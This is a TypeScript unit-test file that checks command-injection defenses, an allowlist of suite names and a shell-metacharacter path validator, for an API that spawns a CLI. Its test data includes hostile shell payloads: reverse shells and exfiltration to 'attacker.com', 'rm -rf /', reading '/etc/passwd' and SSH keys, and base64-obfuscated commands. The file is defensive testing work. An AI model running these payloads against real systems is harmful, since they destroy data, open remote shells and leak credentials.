/**
 * Intelligence Routes Security Tests
 *
 * Unit tests for command injection prevention in intelligence API endpoints.
 * Tests the validation helpers and ensures injection attempts are blocked.
 */

import path from "path";
import { describe, expect, it } from "vitest";

// ============================================================================
// SECURITY VALIDATION HELPERS (extracted for testing)
// ============================================================================

/** Allowlist of valid suite names */
const VALID_SUITES = new Set([
  "ai",
  "security",
  "arch",
  "supply",
  "team",
  "predict",
  "full",
]);

/** Shell metacharacters that could enable command injection */
const SHELL_METACHARACTERS = /[;&|`$(){}\[\]<>\n\r\\"'!#~*?]/;

/**
 * Validates that a suite name is in the allowlist.
 * @throws Error if suite is not valid
 */
function validateSuite(suite: string): void {
  if (!VALID_SUITES.has(suite)) {
    throw new Error(
      `Invalid suite: ${suite}. Valid suites: ${Array.from(VALID_SUITES).join(", ")}`,
    );
  }
}

/**
 * Validates that a path contains no shell metacharacters.
 * Defense-in-depth measure even when using argument arrays.
 * @throws Error if path contains dangerous characters
 */
function validatePathSafe(inputPath: string): void {
  if (SHELL_METACHARACTERS.test(inputPath)) {
    throw new Error("Invalid path: contains potentially dangerous characters");
  }

  // Additional checks for path traversal attempts
  const normalized = path.normalize(inputPath);
  if (normalized.includes("..") && normalized !== inputPath) {
    const resolvedOriginal = path.resolve(inputPath);
    const resolvedNormalized = path.resolve(normalized);
    if (resolvedOriginal !== resolvedNormalized) {
      throw new Error("Invalid path: potential path traversal detected");
    }
  }
}

// ============================================================================
// TEST SUITES
// ============================================================================

describe("Intelligence Routes Security - Command Injection Prevention", () => {
  describe("validateSuite", () => {
    it("should accept valid suite names", () => {
      const validSuites = [
        "ai",
        "security",
        "arch",
        "supply",
        "team",
        "predict",
        "full",
      ];

      for (const suite of validSuites) {
        expect(() => validateSuite(suite)).not.toThrow();
      }
    });

    it("should reject invalid suite names", () => {
      expect(() => validateSuite("invalid")).toThrow(/Invalid suite/);
      expect(() => validateSuite("")).toThrow(/Invalid suite/);
      expect(() => validateSuite("AI")).toThrow(/Invalid suite/); // Case sensitive
    });

    it("should reject command injection via suite parameter", () => {
      // Attempt to inject commands via suite name
      const injectionAttempts = [
        "; rm -rf /",
        "ai; rm -rf /",
        "ai && curl attacker.com",
        "ai | cat /etc/passwd",
        "ai`whoami`",
        "$(curl attacker.com)",
        "ai\nrm -rf /",
      ];

      for (const attempt of injectionAttempts) {
        expect(() => validateSuite(attempt)).toThrow(/Invalid suite/);
      }
    });
  });

  describe("validatePathSafe", () => {
    it("should accept safe paths", () => {
      const safePaths = [
        "/home/user/project",
        "/var/www/app",
        "C:/Users/developer/code",
        "./relative/path",
        "../parent/path",
        "/path/with-dashes",
        "/path/with_underscores",
        "/path/with.dots",
      ];

      for (const safePath of safePaths) {
        expect(() => validatePathSafe(safePath)).not.toThrow();
      }
    });

    it("should reject paths with semicolon injection", () => {
      const injections = [
        "/path; rm -rf /",
        "/path;rm -rf /",
        "project; curl attacker.com/shell.sh | bash",
      ];

      for (const injection of injections) {
        expect(() => validatePathSafe(injection)).toThrow(
          /dangerous characters/,
        );
      }
    });

    it("should reject paths with pipe injection", () => {
      const injections = ["/path | cat /etc/passwd", "/path|malicious"];

      for (const injection of injections) {
        expect(() => validatePathSafe(injection)).toThrow(
          /dangerous characters/,
        );
      }
    });

    it("should reject paths with command substitution", () => {
      const injections = [
        "/path$(whoami)",
        "/path`id`",
        "$(curl attacker.com)",
        "`rm -rf /`",
      ];

      for (const injection of injections) {
        expect(() => validatePathSafe(injection)).toThrow(
          /dangerous characters/,
        );
      }
    });

    it("should reject paths with logical operators", () => {
      const injections = [
        "/path && rm -rf /",
        "/path || malicious",
        "/path&background",
      ];

      for (const injection of injections) {
        expect(() => validatePathSafe(injection)).toThrow(
          /dangerous characters/,
        );
      }
    });

    it("should reject paths with quotes", () => {
      const injections = [
        '/path"injection',
        "/path'injection",
        '/path"; rm -rf /',
      ];

      for (const injection of injections) {
        expect(() => validatePathSafe(injection)).toThrow(
          /dangerous characters/,
        );
      }
    });

    it("should reject paths with newlines", () => {
      const injections = ["/path\nrm -rf /", "/path\r\nmalicious"];

      for (const injection of injections) {
        expect(() => validatePathSafe(injection)).toThrow(
          /dangerous characters/,
        );
      }
    });

    it("should reject paths with redirection operators", () => {
      const injections = [
        "/path > /etc/passwd",
        "/path < /dev/null",
        "/path >> /tmp/evil",
      ];

      for (const injection of injections) {
        expect(() => validatePathSafe(injection)).toThrow(
          /dangerous characters/,
        );
      }
    });

    it("should reject paths with glob/wildcard characters", () => {
      const injections = ["/path/*", "/path/?", "/path/[abc]"];

      for (const injection of injections) {
        expect(() => validatePathSafe(injection)).toThrow(
          /dangerous characters/,
        );
      }
    });

    it("should reject paths with history expansion", () => {
      const injections = ["/path!command", "/path!!"];

      for (const injection of injections) {
        expect(() => validatePathSafe(injection)).toThrow(
          /dangerous characters/,
        );
      }
    });

    it("should reject paths with comment injection", () => {
      expect(() => validatePathSafe("/path #comment")).toThrow(
        /dangerous characters/,
      );
    });

    it("should reject paths with home directory expansion", () => {
      expect(() => validatePathSafe("~/malicious")).toThrow(
        /dangerous characters/,
      );
    });
  });

  describe("Real-world injection payloads", () => {
    const realWorldPayloads = [
      // Classic command injection
      '"; rm -rf /',
      "'; rm -rf /",
      "`rm -rf /`",
      "$(rm -rf /)",

      // Reverse shell attempts
      "; curl attacker.com/shell.sh | bash",
      "; wget -O- attacker.com/pwn | sh",
      "; nc -e /bin/sh attacker.com 4444",
      "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",

      // Data exfiltration
      "; curl attacker.com?data=$(cat /etc/passwd)",
      "; cat /etc/passwd | nc attacker.com 80",

      // Environment variable injection
      "${PATH}",
      "$HOME/.ssh/id_rsa",

      // Encoded/obfuscated attempts
      ";`echo rm -rf /`",
      "$(echo 'cm0gLXJmIC8K' | base64 -d)",

      // Null byte injection
      "/safe/path\x00; rm -rf /",

      // Multi-stage payloads
      "/path; a=rm; b=-rf; c=/; $a $b $c",
    ];

    it("should block all real-world injection payloads", () => {
      for (const payload of realWorldPayloads) {
        expect(() => validatePathSafe(payload)).toThrow();
      }
    });
  });

  describe("Edge cases", () => {
    it("should handle empty strings", () => {
      // Empty string doesn't contain metacharacters but may fail other checks
      expect(() => validatePathSafe("")).not.toThrow();
    });

    it("should handle very long paths", () => {
      const longPath = "/a".repeat(10000);
      expect(() => validatePathSafe(longPath)).not.toThrow();
    });

    it("should handle Unicode paths", () => {
      // Unicode should be allowed (no metacharacters)
      expect(() => validatePathSafe("/путь/项目/プロジェクト")).not.toThrow();
    });

    it("should handle Windows-style paths", () => {
      expect(() => validatePathSafe("C:\\Users\\dev\\project")).toThrow(
        /dangerous characters/,
      );
      expect(() => validatePathSafe("C:/Users/dev/project")).not.toThrow();
    });
  });
});

describe("Integration: spawnSync argument array security", () => {
  it("should document the secure pattern", () => {
    /**
     * The secure pattern uses spawnSync with an argument array:
     *
     * spawnSync("node", [cliPath, suite, "--json", "--path", projectPath], {
     *   shell: false,  // CRITICAL: Never use shell
     *   encoding: "utf8",
     *   maxBuffer: 50 * 1024 * 1024,
     *   timeout: 300000,
     * });
     *
     * This is secure because:
     * 1. Arguments are passed as an array, not interpolated into a string
     * 2. shell: false prevents shell interpretation
     * 3. Each argument is a separate array element, so injection is impossible
     * 4. Defense-in-depth validation catches metacharacters anyway
     */
    expect(true).toBe(true);
  });

  it("should verify argument array isolation", () => {
    // Demonstrate that malicious content in an argument stays contained
    const maliciousPath = "/safe/path; rm -rf /";

    // When passed as array element, this is just a string literal
    // The shell never interprets it
    const args = ["cli.js", "ai", "--json", "--path", maliciousPath];

    // The semicolon is just a character, not a command separator
    expect(args[4]).toBe(maliciousPath);
    expect(args[4].includes(";")).toBe(true);

    // But our defense-in-depth validation would still catch it
    expect(() => validatePathSafe(maliciousPath)).toThrow();
  });
});
